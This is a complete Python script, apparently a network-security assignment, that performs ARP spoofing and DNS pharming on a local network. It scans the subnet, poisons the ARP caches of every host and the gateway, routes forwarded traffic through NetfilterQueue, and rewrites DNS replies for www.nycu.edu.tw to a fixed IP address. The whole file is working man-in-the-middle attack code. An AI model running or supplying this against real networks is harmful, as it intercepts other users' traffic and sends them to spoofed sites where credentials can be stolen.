#!/usr/bin/env python3

from scapy.all import ARP, Ether, srp, send, IP, UDP, DNS, DNSRR, DNSQR
from math import log2
from netfilterqueue import NetfilterQueue
from subprocess import run
import netifaces as ni
gw = ni.gateways()['default'][ni.AF_INET]
arp_table = {}

def network_scan():
    ip = ni.ifaddresses(gw[1])[ni.AF_INET][0]['addr']
    cidr = 32 - sum([int(log2(256-int(i))) for i in ni.ifaddresses(gw[1])[ni.AF_INET][0]['netmask'].split('.')])
    ipscan = ip + '/' + str(cidr)
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ipscan), timeout = 2)
    # ip -> mac
    for sent, recv in ans:
        arp_table[recv.psrc] = recv.hwsrc

    print('Available devices')
    print(' IP Address     | MAC Address       ')
    print('------------------------------------')
    for key in arp_table:
        if(key != gw[0]):
            print(' %-14s | %17s ' % (key, arp_table[key]))

def arp_spoofing():
    for ip in arp_table:
        if ip != gw[0]:
            pkt = ARP(op = 2, pdst = ip, hwdst = arp_table[ip], psrc = gw[0])
            send(pkt, verbose = 0)
            pkt = ARP(op = 2, pdst = gw[0], hwdst = arp_table[gw[0]], psrc = ip)
            send(pkt, verbose = 0)

def pharm(packet):
    pkt = IP(packet.get_payload())
    if pkt.haslayer(DNSRR):
        # print(pkt[DNSQR].qname.decode('utf-8'))
        if "www.nycu.edu.tw." in pkt[DNSQR].qname.decode('utf-8'):
            print("find victim")
            pkt[DNS].an = DNSRR(rrname=pkt[DNSQR].qname, rdata="140.113.207.241")
            pkt[DNS].ancount = 1
            del pkt[IP].len                      
            del pkt[IP].chksum
            del pkt[UDP].len
            del pkt[UDP].chksum

            packet.set_payload(bytes(pkt))
    packet.accept()
     
def main():
    network_scan()
    arp_spoofing()
    run('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
    queue = NetfilterQueue()
    queue.bind(0, pharm)
    try:
        queue.run()
    except KeyboardInterrupt:
        run("iptables --flush", shell = True)
        print('[+] Stop DNS spoofing')
        return

if __name__ == '__main__':
    main()